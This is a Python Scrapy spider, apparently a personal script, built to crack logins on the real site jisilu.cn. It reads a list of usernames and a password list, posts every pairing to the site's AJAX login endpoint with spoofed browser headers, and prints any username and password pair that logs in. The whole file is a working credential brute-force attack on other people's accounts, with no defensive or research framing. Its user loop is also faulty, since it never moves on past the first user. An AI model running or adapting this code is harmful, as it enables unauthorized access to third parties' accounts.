# -*- coding: utf-8 -*-
# website: http://30daydo.com
# @Time : 2020/9/5 14:03
# @File : crack_password.py

# 登录破解
import json

import pymongo
from scrapy import Spider
import codecs
from scrapy import FormRequest, Request
from jsl import config

class CrackSpider(Spider):
    name = 'crack'
    custom_settings = {'COOKIES_ENABLED': False,
                       'DOWNLOADER_MIDDLEWARES': {'jsl.middlewares.MyCustomDownloaderMiddleware': 543},
                       'ITEM_PIPELINES': {'jsl.pipelines.JslPipeline': None},
                       'CONCURRENT_REQUESTS':1
                       }

    def __init__(self, *args,**kwargs):
        super(CrackSpider, self).__init__(*args,**kwargs)
        self.doc = pymongo.MongoClient(host=config.mongodb_host,port=config.mongodb_port)

        filename = 'creator.txt'
        with codecs.open(filename, 'r', encoding='utf8') as f:
            conent = f.readlines()
            self.content = list(map(lambda x: x.strip(), conent))

        self.url = 'https://www.jisilu.cn/account/ajax/login_process/'
        self.data = {
            'return_url': 'https://www.jisilu.cn/',
            'user_name': '',
            'password': '',
            'net_auto_login': '1',
            '_post_type': 'ajax',
        }
        self.headers = {
            'Host': 'www.jisilu.cn', 'Connection': 'keep-alive', 'Pragma': 'no-cache',
            'Cache-Control': 'no-cache', 'Accept': 'application/json,text/javascript,*/*;q=0.01',
            'Origin': 'https://www.jisilu.cn', 'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/67.0.3396.99Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Referer': 'https://www.jisilu.cn/login/',
            'Accept-Encoding': 'gzip,deflate,br',
            'Accept-Language': 'zh,en;q=0.9,en-US;q=0.8'
        }
        with open('password.txt', 'r') as f:
            password_list = f.readlines()
            self.password_list = list(map(lambda x: x.strip(), password_list))

    def start_requests(self):

        yield Request(
            url='https://www.jisilu.cn',
            headers=self.headers,
            callback=self.parse_user,
            cookies=None,
        )

    def parse_user(self, response):
        user = self.content.pop()
        while user:
            for password in self.password_list:
                data = self.data.copy()
                data['user_name'] = user
                data['password'] = password
                yield FormRequest(
                    url=self.url,
                    headers=self.headers,
                    formdata=data,
                    callback=self.parse_data,
                    dont_filter=True,
                    cookies=None,
                    meta={'username':user,'password':password}
                )

    def parse_data(self, response):
        print(response.text)
        js_data = json.loads(response.text)
        errno = js_data.get('errno')
        if errno==0:
            print('*********')
            print('user==>',response.meta['username'])
            print('password==>',response.meta['password'])